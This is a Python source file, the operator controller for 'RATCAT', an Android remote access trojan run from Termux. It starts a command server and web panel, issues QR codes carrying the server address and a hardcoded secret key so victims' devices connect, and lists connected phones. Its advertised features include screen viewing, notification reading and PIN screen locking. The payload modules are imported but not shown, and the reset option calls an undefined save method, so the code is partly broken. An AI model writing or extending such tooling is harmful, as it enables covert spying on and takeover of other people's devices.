#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║    ██████╗  █████╗ ████████╗ ██████╗ █████╗ ████████╗         ║
║    ██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝         ║
║    ██████╔╝███████║   ██║   ██║     ███████║   ██║            ║
║    ██╔══██╗██╔══██║   ██║   ██║     ██╔══██║   ██║            ║
║    ██║  ██║██║  ██║   ██║   ╚██████╗██║  ██║   ██║            ║
║    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝            ║
║                                                                  ║
║              RATCAT CONTROLLER v2.0                              ║
║              Developer: zaax (Zx¡?)                              ║
║              TikTok: @promptbyzaax__                             ║
║                                                                  ║
║   "Remote Access Toolkit - Next Generation"                     ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
from datetime import datetime
from colorama import init, Fore, Style, Back

# Import modules
from server import RATServer
from web_panel import WebPanel
from qr_generator import QRGenerator

# Initialize
init(autoreset=True)

# ==================== VERSION & INFO ====================
VERSION = "2.0"
DEVELOPER = "zaax (Zx¡?)"
TIKTOK = "@promptbyzaax__"
TOOL_NAME = "RATCAT"

# ==================== BANNER ====================
BANNER = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════╗
{Fore.RED}║                                                                  ║
{Fore.RED}║   {Fore.YELLOW}██████╗  █████╗ ████████╗ ██████╗ █████╗ ████████╗{Fore.RED}         ║
{Fore.RED}║   {Fore.YELLOW}██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝{Fore.RED}         ║
{Fore.RED}║   {Fore.YELLOW}██████╔╝███████║   ██║   ██║     ███████║   ██║   {Fore.RED}         ║
{Fore.RED}║   {Fore.YELLOW}██╔══██╗██╔══██║   ██║   ██║     ██╔══██║   ██║   {Fore.RED}         ║
{Fore.RED}║   {Fore.YELLOW}██║  ██║██║  ██║   ██║   ╚██████╗██║  ██║   ██║   {Fore.RED}         ║
{Fore.RED}║   {Fore.YELLOW}╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝   {Fore.RED}         ║
{Fore.RED}║                                                                  ║
{Fore.RED}║   {Fore.GREEN}┌─────────────────────────────────────────────────────┐{Fore.RED}          ║
{Fore.RED}║   {Fore.GREEN}│  {Fore.WHITE}RATCAT CONTROLLER {Fore.YELLOW}v{VERSION}{Fore.GREEN}                       │{Fore.RED}          ║
{Fore.RED}║   {Fore.GREEN}│  {Fore.WHITE}Developer: {Fore.CYAN}{DEVELOPER}{Fore.GREEN}                      │{Fore.RED}          ║
{Fore.RED}║   {Fore.GREEN}│  {Fore.WHITE}TikTok: {Fore.CYAN}{TIKTOK}{Fore.GREEN}                         │{Fore.RED}          ║
{Fore.RED}║   {Fore.GREEN}│  {Fore.WHITE}Status: {Fore.GREEN}READY{Fore.GREEN}                              │{Fore.RED}          ║
{Fore.RED}║   {Fore.GREEN}│  {Fore.WHITE}Mode: {Fore.GREEN}QR CONNECT{Fore.GREEN}                          │{Fore.RED}          ║
{Fore.RED}║   {Fore.GREEN}└─────────────────────────────────────────────────────┘{Fore.RED}          ║
{Fore.RED}║                                                                  ║
{Fore.RED}║   {Fore.YELLOW}"Remote Access Toolkit - Next Generation"{Fore.RED}                   ║
{Fore.RED}║                                                                  ║
{Fore.RED}╚══════════════════════════════════════════════════════════════════╝
{Fore.RESET}
"""

# ==================== CONFIG ====================
class Config:
    def __init__(self, config_file="controller/config.json"):
        self.config_file = config_file
        self.config = self.load()
    
    def load(self):
        default = {
            "host": "0.0.0.0",
            "port": 5555,
            "web_port": 5000,
            "secret_key": "RATCAT_SECURE_2026",
            "max_clients": 50,
            "timeout": 300,
            "log_enabled": True,
            "auto_start_web": True,
            "qr_size": 10
        }
        
        try:
            with open(self.config_file, 'r') as f:
                return json.load(f)
        except:
            os.makedirs(os.path.dirname(self.config_file), exist_ok=True)
            with open(self.config_file, 'w') as f:
                json.dump(default, f, indent=4)
            return default
    
    def get(self, key, default=None):
        return self.config.get(key, default)
    
    def set(self, key, value):
        self.config[key] = value
        with open(self.config_file, 'w') as f:
            json.dump(self.config, f, indent=4)

# ==================== MAIN CONTROLLER ====================
class RATCATController:
    def __init__(self):
        self.config = Config()
        self.server = None
        self.web_panel = None
        self.qr_gen = QRGenerator()
        self.clients = {}
        self.running = True
        
    def show_banner(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print(BANNER)
    
    def start_server(self):
        """Start RAT server"""
        host = self.config.get('host', '0.0.0.0')
        port = self.config.get('port', 5555)
        
        self.server = RATServer(host, port, self)
        
        thread = threading.Thread(target=self.server.start)
        thread.daemon = True
        thread.start()
        
        print(f"{Fore.GREEN}[✓] Server started on {host}:{port}")
    
    def start_web_panel(self):
        """Start web panel"""
        web_port = self.config.get('web_port', 5000)
        
        self.web_panel = WebPanel(self, web_port)
        
        thread = threading.Thread(target=self.web_panel.start)
        thread.daemon = True
        thread.start()
        
        print(f"{Fore.GREEN}[✓] Web panel started on http://localhost:{web_port}")
    
    def generate_qr(self):
        """Generate QR code for client connection"""
        host = self.config.get('host', '0.0.0.0')
        port = self.config.get('port', 5555)
        
        # Get local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            local_ip = host
        
        data = f"RATCAT||{local_ip}||{port}||{self.config.get('secret_key')}"
        
        print(f"\n{Fore.CYAN}[*] Generating QR Code...")
        print(f"{Fore.WHITE}Server IP: {Fore.YELLOW}{local_ip}")
        print(f"{Fore.WHITE}Port: {Fore.YELLOW}{port}")
        
        qr_path = self.qr_gen.generate(data)
        
        print(f"\n{Fore.GREEN}[✓] QR Code saved: {qr_path}")
        print(f"{Fore.CYAN}[*] Scan with RATCAT Client")
        
        # Display QR in terminal
        try:
            self.qr_gen.display_terminal(data)
        except:
            pass
        
        return qr_path
    
    def show_clients(self):
        """Show connected clients"""
        self.show_banner()
        
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│  {Fore.YELLOW}CONNECTED CLIENTS{Fore.CYAN}                                │")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘\n")
        
        if not self.clients:
            print(f"{Fore.YELLOW}[!] No clients connected")
        else:
            for client_id, client in self.clients.items():
                info = client.get('info', {})
                status = f"{Fore.GREEN}● ONLINE" if client.get('connected') else f"{Fore.RED}● OFFLINE"
                print(f"  {Fore.CYAN}{client_id:<20} {status}")
                print(f"    {Fore.WHITE}Device: {Fore.YELLOW}{info.get('device', 'Unknown')}")
                print(f"    {Fore.WHITE}Android: {Fore.YELLOW}{info.get('android', 'Unknown')}")
                print(f"    {Fore.WHITE}IP: {Fore.YELLOW}{client.get('ip', 'Unknown')}")
                print("")
        
        input(f"\n{Fore.YELLOW}[>] Press Enter to continue...")
    
    def show_menu(self):
        """Display main menu"""
        while self.running:
            self.show_banner()
            
            print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
            print(f"{Fore.CYAN}│  {Fore.GREEN}RATCAT MAIN MENU{Fore.CYAN}                                │")
            print(f"{Fore.CYAN}├─────────────────────────────────────────────────────┤")
            print(f"{Fore.GREEN}│  {Fore.WHITE}1. {Fore.YELLOW}START CONTROLLER{Fore.CYAN}                        │")
            print(f"{Fore.GREEN}│  {Fore.WHITE}2. {Fore.YELLOW}GENERATE QR CODE{Fore.CYAN}                       │")
            print(f"{Fore.GREEN}│  {Fore.WHITE}3. {Fore.YELLOW}VIEW CONNECTED CLIENTS{Fore.CYAN}                 │")
            print(f"{Fore.GREEN}│  {Fore.WHITE}4. {Fore.YELLOW}OPEN WEB PANEL{Fore.CYAN}                         │")
            print(f"{Fore.GREEN}│  {Fore.WHITE}5. {Fore.YELLOW}CONFIGURATION{Fore.CYAN}                           │")
            print(f"{Fore.CYAN}├─────────────────────────────────────────────────────┤")
            print(f"{Fore.GREEN}│  {Fore.WHITE}6. {Fore.YELLOW}ABOUT{Fore.CYAN}                                     │")
            print(f"{Fore.GREEN}│  {Fore.WHITE}0. {Fore.RED}EXIT{Fore.CYAN}                                         │")
            print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘")
            
            choice = input(f"\n{Fore.YELLOW}[>] Choose option: ").strip()
            
            if choice == '1':
                self.show_banner()
                print(f"\n{Fore.CYAN}[*] Starting RATCAT Controller...")
                self.start_server()
                self.start_web_panel()
                print(f"\n{Fore.GREEN}[✓] RATCAT is running!")
                print(f"{Fore.CYAN}[*] Scan QR code with client to connect")
                print(f"{Fore.CYAN}[*] Web panel: http://localhost:{self.config.get('web_port', 5000)}")
                input(f"\n{Fore.YELLOW}[>] Press Enter to continue...")
                
            elif choice == '2':
                self.show_banner()
                self.generate_qr()
                input(f"\n{Fore.YELLOW}[>] Press Enter to continue...")
                
            elif choice == '3':
                self.show_clients()
                
            elif choice == '4':
                web_port = self.config.get('web_port', 5000)
                print(f"\n{Fore.CYAN}[*] Opening web panel...")
                print(f"{Fore.GREEN}[✓] Web panel: http://localhost:{web_port}")
                
                # Try to open in browser
                try:
                    if os.name == 'posix':
                        subprocess.run(['termux-open-url', f'http://localhost:{web_port}'])
                    else:
                        import webbrowser
                        webbrowser.open(f'http://localhost:{web_port}')
                except:
                    pass
                
                input(f"\n{Fore.YELLOW}[>] Press Enter to continue...")
                
            elif choice == '5':
                self.show_config()
                
            elif choice == '6':
                self.show_about()
                
            elif choice == '0':
                self.running = False
                print(f"\n{Fore.GREEN}[*] Shutting down RATCAT...")
                if self.server:
                    self.server.stop()
                print(f"{Fore.CYAN}[*] Thanks for using RATCAT!")
                print(f"{Fore.CYAN}[*] Developed by: {DEVELOPER}")
                sys.exit()
            else:
                print(f"{Fore.RED}[!] Invalid option")
                time.sleep(1)
    
    def show_config(self):
        """Show configuration menu"""
        self.show_banner()
        
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│  {Fore.YELLOW}CONFIGURATION{Fore.CYAN}                                     │")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘\n")
        
        print(f"{Fore.WHITE}Current Settings:")
        print(f"  {Fore.CYAN}Port: {Fore.GREEN}{self.config.get('port', 5555)}")
        print(f"  {Fore.CYAN}Web Port: {Fore.GREEN}{self.config.get('web_port', 5000)}")
        print(f"  {Fore.CYAN}Max Clients: {Fore.GREEN}{self.config.get('max_clients', 50)}")
        print(f"  {Fore.CYAN}Timeout: {Fore.GREEN}{self.config.get('timeout', 300)}s")
        print(f"  {Fore.CYAN}Log Enabled: {Fore.GREEN}{self.config.get('log_enabled', True)}")
        
        print(f"\n{Fore.YELLOW}Options:")
        print(f"  1. Change Port")
        print(f"  2. Change Web Port")
        print(f"  3. Toggle Log")
        print(f"  4. Reset to Default")
        print(f"  0. Back")
        
        choice = input(f"\n{Fore.YELLOW}[>] Choose: ").strip()
        
        if choice == '1':
            val = int(input(f"{Fore.WHITE}New Port: ").strip() or "5555")
            self.config.set('port', val)
            print(f"{Fore.GREEN}[✓] Updated")
        elif choice == '2':
            val = int(input(f"{Fore.WHITE}New Web Port: ").strip() or "5000")
            self.config.set('web_port', val)
            print(f"{Fore.GREEN}[✓] Updated")
        elif choice == '3':
            current = self.config.get('log_enabled', True)
            self.config.set('log_enabled', not current)
            print(f"{Fore.GREEN}[✓] Toggled to {not current}")
        elif choice == '4':
            self.config.config = {
                "host": "0.0.0.0",
                "port": 5555,
                "web_port": 5000,
                "secret_key": "RATCAT_SECURE_2026",
                "max_clients": 50,
                "timeout": 300,
                "log_enabled": True,
                "auto_start_web": True,
                "qr_size": 10
            }
            self.config.save()
            print(f"{Fore.GREEN}[✓] Reset to default")
        
        time.sleep(1)
    
    def show_about(self):
        """Show about information"""
        self.show_banner()
        
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│  {Fore.YELLOW}ABOUT RATCAT{Fore.CYAN}                                     │")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘\n")
        
        print(f"{Fore.WHITE}Tool: {Fore.CYAN}RATCAT")
        print(f"{Fore.WHITE}Version: {Fore.CYAN}{VERSION}")
        print(f"{Fore.WHITE}Developer: {Fore.CYAN}{DEVELOPER}")
        print(f"{Fore.WHITE}TikTok: {Fore.CYAN}{TIKTOK}")
        print(f"{Fore.WHITE}Platform: {Fore.CYAN}Android + Termux")
        print(f"{Fore.WHITE}Protocol: {Fore.CYAN}WebSocket + QR Connect")
        
        print(f"\n{Fore.WHITE}Features:")
        print(f"  {Fore.GREEN}• Flashlight Control")
        print(f"  {Fore.GREEN}• YouTube Music Player")
        print(f"  {Fore.GREEN}• Screen Lock with PIN")
        print(f"  {Fore.GREEN}• Screen View (VNC-like)")
        print(f"  {Fore.GREEN}• Wallpaper Changer")
        print(f"  {Fore.GREEN}• Notification Reader")
        
        input(f"\n{Fore.YELLOW}[>] Press Enter to continue...")

# ==================== MAIN ====================
if __name__ == '__main__':
    try:
        controller = RATCATController()
        controller.show_menu()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Interrupted")
        print(f"{Fore.CYAN}[*] Thanks for using RATCAT!")
        print(f"{Fore.CYAN}[*] Developed by: {DEVELOPER}")
        sys.exit()
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}")
        sys.exit()
